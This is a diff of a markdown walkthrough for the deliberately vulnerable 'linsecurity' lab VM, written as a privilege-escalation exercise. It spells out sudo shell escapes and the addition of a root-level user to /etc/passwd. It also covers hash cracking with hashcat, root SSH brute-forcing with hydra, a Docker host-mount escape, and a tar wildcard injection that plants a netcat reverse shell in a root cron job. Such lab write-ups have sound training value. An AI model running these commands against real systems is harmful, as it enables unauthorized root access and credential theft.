@@ -106,9 +106,8 @@ After found [gtfobins](https://gtfobins.github.io/), we'll try theses commands:
 + vi : `sudo vi -c ':!/bin/sh'`
 + zsh : `sudo zsh`
 + pico : `TERM=xterm; TF=$(mktemp); echo 'exec sh' > $TF; chmod +x $TF; sudo pico -s $TF /etc/hosts` (**and after**) `Ctrl+T`
-+ rvim : no found
 + perl : `sudo perl -e 'exec "/bin/sh";'`
-+ tclsh : `sudo tclsh (**and after**) exec /bin/sh <@stdin >@stdout 2>@stderr`
++ tclsh : `sudo tclsh` (**and after**) `exec /bin/sh <@stdin >@stdout 2>@stderr`
 + git : `sudo git help status` (**and after**) `!/bin/sh` 
 + script : `sudo script -c '/bin/sh'`
 
@@ -144,24 +143,30 @@ And execute:
 
     $ sudo sh ./socat.sh
 
-Voila, we have run all commands except `rvim`.
+### rvim 
 
+With rvim, we can create a new user directly with `/etc/passwd`:
+
+     $ perl -le 'print crypt("pass123", "abc")'
+     abBxjdJQWn8xw
+     $ sudo rvim /etc/passwd
+
+Add at the last line:
+
+     captain:abBxjdJQWn8xw:0:0:/root/root/:/bin/bash
+     :wq
+
+Log as captain and you have all control :)
+
+     $ su captain
+     Passwd: pass123
+
+Voila, we have run all commands.
 The content bellow is not yet finished, i explore all other way.
 ---
- We can connect as bob and susan, return to bob and chec peter file:
-
-    $ su bob
-    $ sudo find / -type f -user peter 2>/dev/null
-
-```txt
-/lib/systemd/system/debug.service
-```
-    $ ls -l /lib/systemd/system/debug.service
-    -rw-r--r-- 1 peter root 205 Jul  9 19:56 /lib/systemd/system/debug.service
-
-It should be the final file to gain the root privilege ! 
-
 # LinEnum.sh
+
+Download and launch LinEnum.sh:
 
     $ cd /tmp
     $ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -170,36 +175,87 @@ It should be the final file to gain the root privilege !
 I've cut some parts:
 
 ```sh 
--e [-] Kernel information (continued):
-Linux version 4.15.0-23-generic (buildd@lgw01-amd64-055) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018
--e
-
 -e [-] Contents of /etc/passwd:
 insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
-
--e [-] Super user account(s):
-root
-insecurity
 -e
+```
+LinEnum.sh found a hash, we can bruteforce with JohnTheRipper or HashCat (more faster):
 
+    $ wget -cv https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt
+    $ hashcat AzER3pBZh6WZE -m 1500 rockyou-75.txt
+
+```sh
 -e [-] Root is allowed to login via SSH:
 PermitRootLogin yes
 -e
+```
+We can bruteforce ssh too with `root`, with a nice dictionnary (there are somes dictionnary at [github](https://github.com/danielmiessler/SecLists/tree/master/Passwords):
 
+    $ wget -cv https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkc0de.txt
+    $ hydra -t 4 -l root -P darkc0de.txt 192.168.1.14 ssh
+
+```sh
+-e [-] Crontab contents:
+*/1 *   * * *   root    /etc/cron.daily/backup
+-e
+```
+Look this file:
+
+     $ cat /etc/cron.daily/backup
+
+The script make backup of all user from `/home` at `/etc/backups/`.
+
+    $ ls /etc/backups
+    home-bob.tgz  home-peter.tgz  home-susan.tgz
+
+We going to try a technique call `tar wildcard injection`, this [post](http://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) explain how we can exploit that situation.  
+In resume we can create some files with the same name than tar options like `--checkpoint` and tar will execute these commands... it just sucks :)
+
+First on your pc, generate a payload type reverse\_netcat.
+
+    $ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.32 lport=1234 R
+
+Start netcat: 
+
+    $ nc -lvp 1234
+
+Copy the command under linsecurity:
+
+    $ echo "mkfifo /tmp/phig; nc 192.168.1.32 1234 0</tmp/phig | /bin/sh >/tmp/phig 2>&1; rm /tmp/phig" > shell.sh
+    $ echo "" > "--checkpoint-action=exec=sh shell.sh"
+    $ echo "" > --checkpoint=1
+
+And wait then the cron job start to become root.
+
+    id 
+    uid=0(root) gid=0(root) groups=0(root)
+
+```sh
 -e [-] NFS config details:
 /home/peter *(rw)
 -e 
+```
+NFS
 
+```sh
 -e [+] Looks like we're hosting Docker:
 Docker version 18.03.1-ce, build 9ee9f40
 -e
 ```
+For docker, we can use [rootplease](https://hub.docker.com/r/chrisfosterelli/rootplease/).
 
-I use `johntheripper` to crack the hash under `/etc/passwd`:
+    $ cd /tmp
+    $ git clone https://github.com/chrisfosterelli/dockerrootplease
+    $ docker run -v /:/hostOS -i -t dockerrootplease/rootplease
 
-    $ vim shadow
-    insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh
-    :wq
+# Peter
 
-    $ /usr/sbin/john shadow
-    Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
+We can connect as bob and susan, see if we find peter files:
+
+    $ sudo find / -type f -user peter 2>/dev/null
+    /lib/systemd/system/debug.service
+
+    $ ls -l /lib/systemd/system/debug.service
+    -rw-r--r-- 1 peter root 205 Jul  9 19:56 /lib/systemd/system/debug.service
+
+This service is nice to try an privilege escalation.
